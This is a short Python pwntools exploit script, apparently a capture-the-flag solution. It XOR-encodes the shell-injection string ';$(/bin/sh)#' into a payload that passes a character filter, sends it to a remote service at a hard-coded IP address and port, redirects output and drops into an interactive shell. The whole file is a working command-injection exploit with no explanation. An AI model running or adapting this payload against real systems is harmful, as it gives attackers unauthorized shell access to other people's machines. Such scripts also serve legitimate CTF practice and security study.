import string

from pwn import *

alnum = string.letters + string.digits
alnumext = alnum + '"{}[]()=<>?/+-|:'

#payload_lvl1 = "X" * 20 + 'cx|p0=9<x>49?vrq{' + '{'* 3
target = ";$(/bin/sh)#"

for c in alnum :
  p1 = [chr(ord(c) ^ ord(x)) for x in target] 
  payload = c*len(p1) + "".join(p1)
  if all([x in alnumext for x in payload]):
    #p = process('a.out')
    p = remote('101.0.90.11', 3137)
    print p.recvuntil('PROG_NAME:')
    p.sendline(payload)
    p.sendline("exec 1<&2")
    p.interactive()
